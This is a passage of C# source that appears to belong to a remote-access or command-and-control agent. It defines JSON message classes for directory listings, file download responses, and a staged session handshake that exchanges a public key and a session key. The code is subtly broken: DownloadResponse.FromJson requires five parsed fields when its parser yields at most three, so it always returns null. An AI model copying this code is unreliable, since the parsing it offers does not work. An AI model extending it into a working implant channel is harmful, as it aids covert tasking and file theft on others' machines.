                int count = 0;
                foreach (FileSystemEntry entry in directory_list.directory_list)
                {
                    if ((count + 1) == directory_list.directory_list.Count)
                    {
                        responses += FileSystemEntry.ToJson(entry);
                    }
                    else
                    {
                        responses += FileSystemEntry.ToJson(entry) + ',';
                    }
                    ++count;
                }
                return "[" + responses + "]";
            }
        }

        public class FileSystemEntry
        {
            public string file_name { get; set; }
            public int size { get; set; }
            public string timestamp { get; set; }
            public string IsDir { get; set; }

            public string ListFormat = @"{{""file_name"":""{0}"",""size"":{1},""timestamp"":""{2}"",""IsDir"":{3}}}";

            public static string ToJson(FileSystemEntry listing)
            {
                return String.Format(
                    listing.ListFormat,
                    JavaScriptStringEncode(listing.file_name),
                    JavaScriptStringEncode(listing.size.ToString()),
                    JavaScriptStringEncode(listing.timestamp),
                    JavaScriptStringEncode(listing.IsDir)
                );
            }
        }

        public class DownloadResponse
        {
            public string status { get; set; }
            public string file_id { get; set; }
            public string task_id { get; set; }

            public static string DownloadResponseFormat = @"{{""status"":""{0}"",""file_id"":""{1}"",""task_id"":""{2}""}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", @"{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                Match match = new Regex(format).Match(data.Replace(@"\", @""));
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                return matches;
            }

            public static DownloadResponse FromJson(string message)
            {
                List<string> parseList = DownloadResponse.Parse(message, DownloadResponseFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 5) { return null; }
                return new DownloadResponse
                {
                    status = parseList[0],
                    file_id = parseList[1],
                    task_id = parseList[2]
                };
            }
        }

        public class GetStage
        {
            public string action { get; set; }
            public string pub_key { get; set; }
            public string session_id { get; set; }

            public string JsonFormat = @"{{""action"":""{0}"",""pub_key"":""{1}"",""session_id"":""{2}""}}";

            public static string ToJson(GetStage get_stage)
            {
                return String.Format(
                    get_stage.JsonFormat,
                    JavaScriptStringEncode(get_stage.action),
                    JavaScriptStringEncode(get_stage.pub_key),
                    JavaScriptStringEncode(get_stage.session_id)
                );
            }
        }

        public class StageResponse
        {
            public string action { get; set; }
            public string uuid { get; set; }
            public string session_key { get; set; }
            public string session_id { get; set; }


            public static string JsonFormat = @"{{""uuid"":""{0}"",""session_key"":""{1}"",""action"":""{2}"",""session_id"":""{3}""}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", @"{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
                Match match = new Regex(format).Match(data.Replace(@"\", @""));
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
                return matches;
            }

            public static StageResponse FromJson(string message)
            {
                List<string> parseList = StageResponse.Parse(message, JsonFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 4) { return null; }
                return new StageResponse
                {
                    action = parseList[2],
                    uuid = parseList[0],
                    session_key = parseList[1],
                    session_id = parseList[3]
                };
            }
        }
    }
}
